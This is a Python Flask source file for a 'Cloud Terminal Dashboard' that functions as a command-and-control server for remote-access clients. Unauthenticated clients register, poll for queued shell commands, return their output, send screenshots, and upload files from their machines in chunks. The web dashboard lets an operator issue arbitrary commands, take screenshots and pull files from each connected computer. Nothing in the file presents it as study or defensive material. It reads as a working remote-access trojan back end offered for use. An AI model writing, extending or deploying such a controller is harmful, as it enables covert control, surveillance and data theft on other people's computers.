# server_render_fixed.py - Fixed dashboard (no auto-refresh)

from flask import Flask, request, jsonify, render_template_string, send_from_directory
from flask_cors import CORS
import base64
import os
import uuid

app = Flask(__name__)
CORS(app)

clients = {}
commands = {}
file_chunks = {}

UPLOAD_FOLDER = os.environ.get('UPLOAD_FOLDER', '/tmp/data')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Fixed HTML - No auto-refresh of the whole page
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Cloud Terminal Dashboard</title>
    <style>
        body { background:#111; color:#eee; font-family:Arial; margin:20px; }
        .client { border:1px solid #444; padding:10px; margin:10px 0; border-radius:5px; background:#1a1a1a; }
        input { width:300px; padding:8px; margin:5px; background:#333; color:#fff; border:1px solid #555; border-radius:3px; }
        input:focus { outline:none; border-color:#00ff00; }
        pre {
            background:#000;
            color:#00ff00;
            padding:10px;
            height:250px;
            overflow-y:auto;
            font-family:monospace;
            border-radius:5px;
            margin-top:10px;
        }
        img { margin-top:10px; border:1px solid #333; max-width:300px; border-radius:5px; }
        button {
            background:#00ff00;
            color:black;
            border:none;
            padding:8px 15px;
            margin:2px;
            cursor:pointer;
            border-radius:3px;
            font-weight:bold;
        }
        button:hover { background:#00cc00; transform:scale(1.02); }
        .upload-btn { background:#ff6600; }
        .upload-btn:hover { background:#ff4400; }
        .progress-container {
            width:100%;
            background-color:#333;
            margin:10px 0;
            border-radius:5px;
            display:none;
        }
        .progress-bar {
            width:0%;
            height:25px;
            background-color:#00ff00;
            text-align:center;
            line-height:25px;
            color:black;
            border-radius:5px;
            transition:width 0.3s;
            font-weight:bold;
        }
        .status { 
            color:#00ff00; 
            margin:5px; 
            padding:10px;
            background:#1a1a1a;
            border-radius:5px;
            font-family:monospace;
        }
        h1 { color:#00ff00; }
        .client-header { 
            display:flex; 
            justify-content:space-between; 
            align-items:center;
            margin-bottom:10px;
        }
        .client-id { 
            background:#333; 
            padding:5px 10px; 
            border-radius:5px;
            font-family:monospace;
        }
    </style>
</head>
<body>
    <h1>☁️ Cloud Terminal Dashboard</h1>
    <div class="status" id="status">Loading clients...</div>
    <div id="clients"></div>

    <script>
        let clientsData = {};
        let refreshInterval = null;
        
        // Function to add new client to UI
        function addClientToUI(id) {
            if (document.getElementById(`client-${id}`)) return;
            
            let container = document.getElementById("clients");
            let clientDiv = document.createElement("div");
            clientDiv.className = "client";
            clientDiv.id = `client-${id}`;
            clientDiv.innerHTML = `
                <div class="client-header">
                    <h3>🖥️ Client <span class="client-id">${id}</span></h3>
                </div>
                
                <input type="text" id="cmd${id}" placeholder="Enter command" size="50">
                <button onclick="sendCmd('${id}')">Send</button>
                <button onclick="sendQuick('${id}','screenshot')">📸 Screenshot</button>
                
                <br><br>
                
                <input type="text" id="upload${id}" placeholder="File path on client (e.g., C:\\\\test.txt)" size="50">
                <button class="upload-btn" onclick="uploadFile('${id}')">⬆️ Upload File</button>
                
                <br><br>
                
                <input type="text" id="download${id}" placeholder="Filename on server (e.g., client1_test.txt)" size="50">
                <button onclick="downloadFile('${id}')">⬇️ Download File</button>
                
                <div class="progress-container" id="progressContainer${id}">
                    <div class="progress-bar" id="progressBar${id}">0%</div>
                </div>
                
                <pre id="out${id}">[Ready]\\n</pre>
                <img id="img${id}" style="max-width:300px; display:none;"/>
            `;
            container.appendChild(clientDiv);
        }
        
        // Send command
        function sendCmd(id) {
            let input = document.getElementById("cmd"+id);
            let cmd = input.value;
            if(!cmd) return;
            
            fetch('/send_command/'+id, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({command:cmd})
            });
            input.value = "";
            addOutput(id, `> ${cmd}\\n`);
        }
        
        function sendQuick(id, cmd) {
            fetch('/send_command/'+id, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({command:cmd})
            });
            addOutput(id, `> ${cmd}\\n`);
        }
        
        function uploadFile(id) {
            let filepath = document.getElementById("upload"+id).value;
            if(!filepath) {
                alert("Please enter a file path");
                return;
            }
            sendQuick(id, "upload " + filepath);
        }
        
        function downloadFile(id) {
            let filename = document.getElementById("download"+id).value;
            if(!filename) {
                alert("Please enter a filename");
                return;
            }
            sendQuick(id, "download " + filename);
        }
        
        function addOutput(id, text) {
            let el = document.getElementById("out"+id);
            if(el) {
                el.textContent += text;
                el.scrollTop = el.scrollHeight;
            }
        }
        
        // Poll for updates (without refreshing the whole page)
        function pollUpdates() {
            // Get client list
            fetch('/get_clients')
                .then(res => res.json())
                .then(data => {
                    // Add new clients
                    Object.keys(data).forEach(id => {
                        if (!clientsData[id]) {
                            addClientToUI(id);
                        }
                    });
                    clientsData = data;
                    document.getElementById("status").innerHTML = "✅ Connected - " + Object.keys(clientsData).length + " client(s) online";
                });
            
            // Get outputs
            fetch('/get_outputs')
                .then(res => res.json())
                .then(data => {
                    for(let id in data) {
                        if(data[id]) {
                            addOutput(id, data[id]);
                        }
                    }
                });
            
            // Get screenshots
            fetch('/get_screenshots')
                .then(res => res.json())
                .then(data => {
                    for(let id in data) {
                        let img = document.getElementById("img"+id);
                        if(img && data[id]) {
                            img.style.display = "block";
                            img.src = data[id] + "?t=" + Date.now();
                        }
                    }
                });
            
            // Get progress
            fetch('/get_progress')
                .then(res => res.json())
                .then(data => {
                    for(let id in data) {
                        let container = document.getElementById("progressContainer"+id);
                        let bar = document.getElementById("progressBar"+id);
                        if(container && bar && data[id] > 0) {
                            container.style.display = "block";
                            bar.style.width = data[id] + "%";
                            bar.textContent = data[id] + "%";
                            if(data[id] >= 100) {
                                setTimeout(() => {
                                    container.style.display = "none";
                                    bar.style.width = "0%";
                                }, 2000);
                            }
                        }
                    }
                });
        }
        
        // Start polling every 2 seconds (only data, no page refresh)
        pollUpdates();
        refreshInterval = setInterval(pollUpdates, 2000);
        
        // Handle Enter key
        document.addEventListener("keypress", function(e) {
            if (e.key === "Enter") {
                let active = document.activeElement;
                if (active.id && active.id.startsWith("cmd")) {
                    let id = active.id.replace("cmd","");
                    sendCmd(id);
                }
            }
        });
    </script>
</body>
</html>
"""

@app.route("/")
def dashboard():
    return render_template_string(HTML)

@app.route("/get_clients")
def get_clients():
    return jsonify(clients)

@app.route("/get_outputs")
def get_outputs():
    outputs = {}
    for client_id in clients:
        if 'output' in clients[client_id] and clients[client_id]['output']:
            outputs[client_id] = clients[client_id]['output']
            clients[client_id]['output'] = ''  # Clear after sending
    return jsonify(outputs)

@app.route("/get_screenshots")
def get_screenshots():
    screenshots = {}
    for client_id in clients:
        if 'screenshot' in clients[client_id]:
            screenshots[client_id] = clients[client_id]['screenshot']
    return jsonify(screenshots)

@app.route("/get_progress")
def get_progress():
    progress = {}
    for client_id in clients:
        if 'progress' in clients[client_id] and clients[client_id]['progress'] > 0:
            progress[client_id] = clients[client_id]['progress']
    return jsonify(progress)

@app.route("/register", methods=["POST"])
def register():
    client_id = str(uuid.uuid4())[:8]
    clients[client_id] = {
        'connected': True,
        'output': '',
        'progress': 0
    }
    commands[client_id] = []
    print(f"[+] Client registered: {client_id}")
    return jsonify({"client_id": client_id})

@app.route("/get_command/<client_id>")
def get_command(client_id):
    if client_id in commands and commands[client_id]:
        cmd = commands[client_id].pop(0)
        return jsonify({"command": cmd})
    return jsonify({"command": None})

@app.route("/send_command/<client_id>", methods=["POST"])
def send_command(client_id):
    cmd = request.json.get("command")
    if client_id not in commands:
        commands[client_id] = []
    commands[client_id].append(cmd)
    print(f"[+] Command to {client_id}: {cmd}")
    return jsonify({"status": "sent"})

@app.route("/send_result/<client_id>", methods=["POST"])
def send_result(client_id):
    data = request.json
    
    if "output" in data:
        if client_id not in clients:
            clients[client_id] = {}
        clients[client_id]['output'] = data["output"]
    
    if "screenshot" in data:
        img = base64.b64decode(data["screenshot"])
        path = os.path.join(UPLOAD_FOLDER, f"client{client_id}.png")
        with open(path, "wb") as f:
            f.write(img)
        clients[client_id]['screenshot'] = f"/files/client{client_id}.png"
        print(f"[+] Screenshot from {client_id}")
    
    return jsonify({"status": "ok"})

@app.route("/upload_chunk", methods=["POST"])
def upload_chunk():
    data = request.json
    client_id = data["id"]
    filename = data["filename"]
    chunk_index = data["index"]
    total_chunks = data["total"]
    chunk_data = base64.b64decode(data["data"])
    
    key = f"{client_id}_{filename}"
    
    if key not in file_chunks:
        file_chunks[key] = [None] * total_chunks
    
    file_chunks[key][chunk_index] = chunk_data
    percent = int((chunk_index + 1) / total_chunks * 100)
    
    if client_id in clients:
        clients[client_id]['progress'] = percent
    
    if all(chunk is not None for chunk in file_chunks[key]):
        file_path = os.path.join(UPLOAD_FOLDER, key)
        with open(file_path, "wb") as f:
            for chunk in file_chunks[key]:
                f.write(chunk)
        del file_chunks[key]
        
        if client_id in clients:
            clients[client_id]['output'] = f"[+] File uploaded: {filename}\n"
            clients[client_id]['progress'] = 0
    
    return jsonify({"status": "ok"})

@app.route("/download_file/<client_id>/<filename>")
def download_file(client_id, filename):
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(file_path):
        return send_from_directory(UPLOAD_FOLDER, filename)
    else:
        return jsonify({"error": "File not found"}), 404

@app.route("/files/<path:filename>")
def files(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print(f"[*] Server starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
